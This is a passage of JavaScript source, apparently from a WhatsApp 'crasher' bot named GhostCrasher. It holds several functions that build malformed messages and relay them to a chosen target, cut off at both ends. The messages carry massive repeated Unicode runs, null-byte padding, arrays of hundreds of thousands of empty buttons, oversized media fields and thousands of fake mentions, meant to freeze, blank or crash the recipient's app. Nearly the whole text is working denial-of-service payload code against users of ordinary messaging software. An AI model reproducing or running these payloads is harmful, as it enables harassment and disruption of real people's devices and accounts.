                contextInfo: {
                    remoteJid: "meta@ai"
                }
            }
        })
    ).finish();

    const AsilentPaylo = (tag, depth) => {
        let buffer = Asilentmsgimage;
        for (let i = 0; i < depth; i++) {
            buffer = AsilentKing(tag, AsilentKing([0x0A], buffer));
        }
        return buffer;
    };

    const sendAsilent = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log(`Stopped`);
            return;
        }

        try {
            if (count < 10) {
                const meseg = {
                    interactiveMessage: {
                        body: { text: "k7" }
                    }
                };

                await sock.relayMessage(target, meseg, {
                    noSelfSync: true,
                });
            }

            let fc = 5;
            let attempt = 0;
            for (const currentTag of mentionedTags) {
                let paylomeseg = null;
                let currentDepth = 5000;
                let render = targetMention.slice(attempt, attempt + fc);
                while (currentDepth >= 2000 && !paylomeseg) {
                    try {
                        const raw = AsilentPaylo(currentTag, currentDepth);
                        const parsed = proto.Message.decode(raw);
                        proto.Message.encode(parsed).finish();
                        paylomeseg = parsed;
                    } catch (_) {
                    }
                    currentDepth -= 400;
                }

                if (!paylomeseg) continue;

                const messageId = 'sky' + Date.now().toString(36).toUpperCase() + '_' + attempt;

                await sock.relayMessage('status@broadcast', paylomeseg, {
                    messageId,
                    statusJidList: render,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: render.map(function(target) {
                                return { tag: 'to', attrs: { jid: target }, content: [] };
                            })
                        }]
                    }]
                });
                attempt++;
            }

            count++;
            sendAsilent();

        } catch (error) {
            console.error(`[ pure forceclose ] error`);
            setTimeout(sendAsilent, 2000);
        }
    };

    sendAsilent();
}

async function DelayGroupNew(sock, target) {
  for(let z = 0; z < 75; z++) {
    let ZxY = {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 72}@s.whatsapp.net`), 
          isForwarded: true, 
          forwardingScore: 7205,
          forwardedNewsletterMessageInfo: {
            newsletterJid: "120363424020283759@newsletter", 
            newsletterName: "霊 (20.) Phrase: ”Skylinneeee“", 
            serverMessageId: 1000,
            accessibilityText: "霊 (20.) Phrase: ”Skylinneee“"
          }, 
          statusAttributionType: "RESHARED_FROM_MENTION", 
          contactVcard: true, 
          isSampled: true, 
          dissapearingMode: {
            initiator: target, 
            initiatedByMe: true
          }, 
          expiration: Date.now()
        }, 
        body: {
          text: "霊 (20.) Phrase: ”Skylinneeeee“",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "address_message",
          paramsJson: `{\"values\":{\"in_pin_code\":\"7205\",\"building_name\":\"russian motel\",\"address\":\"2.7205\",\"tower_number\":\"507\",\"city\":\"Batavia\",\"name\":\"JustinOfficial\",\"phone_number\":\"+13135550202\",\"house_number\":\"7205826\",\"floor_number\":\"16\",\"state\":\"${"\u0000".repeat(900000)}\"}}`,
          version: 3
        }
      }
    };
    
    let msg = generateWAMessageFromContent(target, {
      groupStatusMessageV2: {
        message: ZxY
      }
    }, {});
  
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });
    await sleep(1000);
    await sock.sendMessage(target, {
      delete: msg.key
    }) 
  }
}

async function CrasNoCLikV3(sock, target) {
  const XHitS = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
         header: {
        imageMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
      mimetype: "image/jpeg",
      fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
      fileLength: 9999,
      height: 9999,
      width: 9999,
      mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
      fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
      directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
      mediaKeyTimestamp: "1776937541",
      jpegThumbnail: null,
      caption: "Skylinne!",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    },
  },
   body: {
   text: "Skylinne!"
},
 nativeFlowMessage: {
 buttons: Array.from({ length: 500000 }, () => ({}))
}
}
}
}
};

const aji = generateWAMessageFromContent(target, XHitS, {});

await sock.relayMessage(target, aji.message, {
// participant: true, 
  messageId: aji.key.id
})

const Locysk = {
groupStatusMessageV2: { 
message: {
interactiveMessage: {
body: {
text: "GhostCrasher"
},
nativeFlowMessage: {
buttons: Array.from({ length: 500000 }, () => ({}))
},
},
},
},
};

const xgh = generateWAMessageFromContent(target, Locysk, {});

await sock.relayMessage(target, xgh.message, {
// participant: true, 
messageId: xgh.key.id
})
}

async function BlankScreenV1(sock, target) {
    const LexzyExe = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "GhostCrasher - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: "{}".repeat(75000),
                    },
                },
            },
        },
    };

    const Lexx = generateWAMessageFromContent(target, LexzyExe, {});

    await sock.relayMessage(target, Lexx.message, {
        participant: target,
        messageId: Lexx.key.id
    });

    await sock.relayMessage(target, {
        stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(75000),
            publisher: "GhostCrasher - Executed¿!" + "ꦾ".repeat(5000),
            stickers: [],
            fileLength: "366299919",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
            contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: ["13135555555@s.whatsapp.net"]
            },
            packDescription: "",
            mediaKeyTimestamp: "1747502082",
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 999999999,
            thumbnailWidth: 9999999999,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "9990099",
            stickerPackOrigin: "USER_CREATED"
        }
    }, {});

    await sock.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "Skylinne",
                            locationMessage: {
                                degreesLatitude: -999.03499999999999,
                                degreesLongitude: 922.9999999999999,
                                name: "GhostCrasher",
                                address: "X",
                                jpegThumbnail: null,
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: "GhostCrasher - Executed¿!",
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "address_message",
                                    buttonParamsJson: "ြ ".repeat(9000),
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: "ြ ".repeat(75000),
                                },
                            ],
                            messageParamsJson: "wa.me/stickerpack/LexzyMods",
                            messageVersion: 1,
                        },
                    },
                },
            },
        },
        {}
    );

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                videoMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
                    mimetype: "video/mp4",
                    caption: "LexzyMods - Executed¿!",
                    fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
                    fileLength: "1099511627776",
                    seconds: 172800,
                    mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
                    height: 1080,
                    width: 1920,
                    fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
                    directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1774428565",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAKAMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAgMEBQYBAQEBAQEAAAAAAAAAAAAAAAAAAgMB/9oADAMBAAIQAxAAAADzL0VRwnekefd8ThLRzuO2/JxNWKr5ZFS+12VFgitnN6HKX8UQ1y6bCz0xiswAP//EACQQAAICAQQBBAMAAAAAAAAAAAECAAMREhMhMVIEQQIgQVFT/9oACAEBAAE/APi9NXgJtVeAgqq8BNmrwE2qvASx8YAGSY6XhM6ADK67rG0k6Zz0ex7EoHrL9ZltulMoMyi8sgY4jNhmycnMFgnqC5AYdAytToLseCJUFstFYfiKoFtidkGFZfWNpgIrl61B4HUrC1EkMfowNm4n8kQmEZioEezJ6ms9Z4jMAARAwZQRN+n+gl/qFNrFeobQScCaz+5Xdob6+X//xAAbEQACAgMBAAAAAAAAAAAAAAABESACECAhQf/aAAgBAgEBPwB6PFEYa+4pwwkLX//EABsRAAICAwEAAAAAAAAAAAAAAAECABEDICEQ/9oACAEDAQE/ANskB8fqxVNgxlF80//Z",
                    annotations: [
                        {
                            polygonVertices: [
                                {
                                    x: 0.17499999701976776,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.3379453122615814
                                },
                                {
                                    x: 0.824999988079071,
                                    y: 0.6620468497276306
                                },
                                {
                                    x: 0.17499999701976776,
                                    y: 0.6620468497276306
                                }
                            ],
                            shouldSkipConfirmation: true,
                            embeddedContent: {
                                embeddedMusic: {
                                    musicContentMediaId: "2261401457948346",
                                    songId: "849859527815275",
                                    author: "GhostCrasher - Executed¿!" + "ြ".repeat(9000),
                                    title: "ြ".repeat(75000),
                                    artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                                    artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                                    artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                                    artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                                    artistAttribution: "https://www.instagram.com/_u/lexzymods",
                                    countryBlocklist: "WEs=",
                                    isExplicit: false
                                }
                            },
                            embeddedAction: true
                        }
                    ]
                }
            }
        }
    }, {});

    const bot = "867051314767696@bot";

    await sock.relayMessage(target, {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,

                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${bot.split("@")[0]}`
                        },

                        {
                            messageType: 5,
                            codeMetadata: {
                                codeLanguage: "javascript",

                                codeBlocks: [
                                    {
                                        highlightType: 1,
                                        codeContent: "const = {"
                                    },
                                    {
                                        highlightType: 2,
                                        codeContent: "GhostCrasher - Executed¿!"
                                    },
                                    {
                                        highlightType: 3,
                                        codeContent: `${"\0".repeat(75000)}` + `${"\x10".repeat(25000)}`
                                    }
                                ]
                            }
                        }
                    ],

                    contextInfo: {
                        mentionedJid: [bot],

                        featureEligibilities: Array.from(
                            { length: 1999 },
                            () => ({
                                canReceiveMultiReact: true
                            })
                        ),

                        isForwarded: true,

                        forwardedAiBotMessageInfo: {
                            botJid: bot
                        },

                        forwardOrigin: 4
                    }
                }
            }
        }
    }, {});

    const Iniochamy = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "GhostCrasher - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999987899999999999999,
                                998999999999999999999,
                                999899999999999999999,
                                9998789999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "GhostCrasher - Executed¿!",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Iniochamyy = generateWAMessageFromContent(target, Iniochamy, {});

    await sock.relayMessage(target, Iniochamyy.message, {
        participant: target,
        messageId: Iniochamyy.key.id
    });

    const LexMsg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "GhostCrasher - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999,
                                9999999999999999999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "GhostCrasher - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexca = generateWAMessageFromContent(target, LexMsg, {});

    await sock.relayMessage(target, Lexca.message, {
        participant: target,
        messageId: Lexca.key.id
    });

    const Lexcaa = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "GhostCrasher - Executed¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

    await sock.relayMessage(target, Lexcaabos.message, {
        participant: target,
        messageId: Lexcaabos.key.id
    });

    const msg = {
        key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
        message: {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                caption: "GhostCrasher - Executed¿!",
                fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                fileLength: 9999999,
                height: 9999,
                width: 9999,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: largeThumbnail,
                scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                scanLengths: [
                    9899999999999999077,
                    8899999999999998555,
                    9699999999999999148,
                    1069999999999999164
                ],
                midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
                contextInfo: {
                    pairedMediaType: "NOT_PAIRED_MEDIA",
                    isQuestion: true,
                    isGroupStatus: true,
                    remoteJid: "status@broadcast",
                    entryPointConversionDelaySeconds: 999999,
                    entryPointConversionSource: "booking_status"
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", msg.message, {
        statusJidList: [target],
        messageId: msg.key.id,
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: { jid: target },
                    content: undefined
                }]
            }]
        }]
    });

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                },
                additionalNodes: [{
                    tag: "meta",
                    attrs: { is_status_mention: "false" },
                    content: undefined
                }]
            }
        }
    }, {});

    await sock.relayMessage(target, {
        statusMentionMessage: {
            message: {
                protocolMessage: {
                    key: msg.key,
                    type: 25
                }
            }
        }
    }, {});
}

async function Delayhardio(sock, target) {
  try {
    const shadow = "\u2063".repeat(5000);
    const alight = "\u300B".repeat(5000);
    
    const msg1 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ☠️-¿?GhostCrasher¿?- ☠️",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1045000),
              version: 3,
            },
            entryPointConversionSource: "call_permission_request",
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background:
        "#" +
        Math.floor(Math.random() * 16777215)
          .toString(16)
          .padStart(6, "99999999"),
    }
  );
 
  const mediaData = [
    {
      ID: "68917912",
      uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
      buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
      mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
    },
    {
      ID: "68884989",
      uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
      buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
      sid: "5e03e0",
      SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
      ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
      mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
    },
  ]

  let sequentialIndex = 0
  console.log(chalk.red(`${target} Proses send #1`))

  const selectedMedia = mediaData[sequentialIndex]
  sequentialIndex = (sequentialIndex + 1) % mediaData.length
  const { ID, uri, buffer, sid, SHA256, ENCSHA256, mkey } = selectedMedia

  const contextInfo = {
    participant: target,
    mentionedJid: [
      target,
      ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
    ],
  }

  const stickerMsg = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}&mms3=true`,
          fileSha256: SHA256,
          fileEncSha256: ENCSHA256,
          mediaKey: mkey,
          mimetype: "image/webp",
          directPath: `/v/${uri}=${buffer}=${ID}&_nc_sid=${sid}`,
          fileLength: { low: Math.floor(Math.random() * 1000), high: 0, unsigned: true },
          mediaKeyTimestamp: { low: Math.floor(Math.random() * 1700000000), high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }

const msgxay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "☠️-¿?GhostCrasher¿?- ☠️", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }
  const interMsg = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "GhostCrasher", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "galaxy_message",
        },
      },
    },
  }

  const statusMessages = [stickerMsg, interMsg, msgxay]
 
  
    let content = {
        extendedTextMessage: {
          text: "☠️-¿?GhostCrasher¿?- ☠️" + "ꦾ".repeat(100000),
          matchedText: "ꦽ".repeat(20000),
          description: "☠️-¿?GhostCrasher¿?- ☠️",
          title: "ꦽ".repeat(20000),
          previewType: "NONE",
          jpegThumbnail:
            "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 9999,
            participant: target,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1995 },
                () =>
                  `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              newsletterAdminInviteMessage: {
                newsletterJid: "alight@newsletter",
                newsletterName:
                  "☠️-¿?GhostCrasher¿?- ☠️" + "ꦾ".repeat(100000),
                caption:
                  "☠️-¿?GhostCrasher¿?- ☠️" +
                  "ꦾ".repeat(60000) +
                  "ោ៝".repeat(60000),
                inviteExpiration: "999999999"
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName:
                "☠️-¿?GhostCrasher¿?- ☠️" + "ោ៝꙰꙰꙰".repeat(10000),
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      };
      
    const xnxxmsg = generateWAMessageFromContent(target, content, {});

  

    const msg2 = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 99999,
        width: 99999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12261,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1999 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };
    console.log(chalk.red(`${target} Proses send #2`)) 

    const msg3 = await generateWAMessageFromContent(
    target,
    {
      extendedTextMessage: {
        text: "☠️-¿?GhostCrasher¿?- ☠️",
        matchedText: "https://wa.me/13135550002?s=5",
        description: "҉҈⃝⃞⃟⃠⃤꙰꙲" + "𑇂𑆵𑆴𑆿".repeat(100000),
        title: "ꦾ" + "𑇂𑆵𑆴𑆿".repeat(100000),
        previewType: "NONE",
        jpegThumbnail: null,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    },
    { ephemeralExpiration: 5, timeStamp: Date.now() }
  );
    console.log(chalk.red(`${target} Proses send #3`))
    
    const msg4 = {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "☠️-¿?GhostCrasher¿?- ☠️" + "ꦽ".repeat(3000),
                            format: "DEFAULT",
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "13135550002@s.whatsapp.net",
                            nativeFlowResponseMessage: [
                                { name: "call_permission_request", paramsJson: "\u0000".repeat(10000) },
                                { name: "delete_chat_request", paramsJson: "\u0000".repeat(4000) },
                                { name: "video_call_request", paramsJson: "\u0000".repeat(20000) },
                                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(5000) + shadow },
